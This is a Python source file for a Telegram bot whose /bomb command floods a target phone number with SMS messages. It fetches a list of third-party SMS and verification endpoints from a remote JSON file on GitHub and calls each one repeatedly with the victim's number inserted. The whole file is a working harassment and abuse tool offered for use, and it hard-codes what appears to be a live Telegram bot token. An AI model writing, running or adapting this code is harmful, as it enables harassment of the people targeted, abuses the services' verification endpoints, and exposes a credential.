import logging
import requests
import json
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

# Global variable to store loaded APIs
apis = []

# Load APIs from the specified JSON URL
def load_apis(json_url):
    try:
        response = requests.get(json_url)
        response.raise_for_status()
        global apis
        apis = response.json()['apis']
        logging.info("APIs loaded successfully.")
    except Exception as e:
        logging.error(f"Failed to load APIs: {str(e)}")

# Define a command handler for /bomb command
def bomb(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("Enter the target phone number and the amount of SMS messages to send.")

# Define a message handler to handle user input
def handle_message(update: Update, context: CallbackContext) -> None:
    try:
        # Extract phone number and amount from user input
        phone_number = update.message.text.split()[0]
        amount = int(update.message.text.split()[1])

        # Validate phone number and amount
        if amount > 0 and len(phone_number) == 10:
            c = 0

            while c < amount:
                for api in apis:
                    url = api['url'].replace("*****", phone_number)
                    method = api.get('method', 'GET')
                    headers = api.get('headers', {})
                    body = api.get('body', None)

                    # Make HTTP request to the API
                    try:
                        response = requests.request(method, url, headers=headers, data=body)
                        # Log response if needed
                        logging.info(f"API Request: {url} - Status Code: {response.status_code}")
                    except Exception as e:
                        logging.error(f"API Request Error: {str(e)}")

                    c += 1

            update.message.reply_text(f"SMS bombing initiated to {phone_number} ({amount} SMS sent).")
        else:
            update.message.reply_text("Invalid phone number or amount. Use /bomb [phone_number] [amount].")
    except Exception as e:
        update.message.reply_text("Invalid input format. Use /bomb [phone_number] [amount].")

def main() -> None:
    # Load APIs from the specified JSON URL
    load_apis("https://raw.githubusercontent.com/trthunder/sms/main/assets/apis.json")

    # Create the Updater and pass it your bot's token
    updater = Updater("7047664006:AAHox79A5kt1MmpSZn4sUKTkx4g4wpHVtaY")

    # Get the dispatcher to register handlers
    dispatcher = updater.dispatcher

    # Register command handlers
    dispatcher.add_handler(CommandHandler("bomb", bomb))

    # Register a message handler to handle all messages
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # Start the Bot
    updater.start_polling()

    # Run the bot until you send a signal to stop it
    updater.idle()

if __name__ == '__main__':
    main()
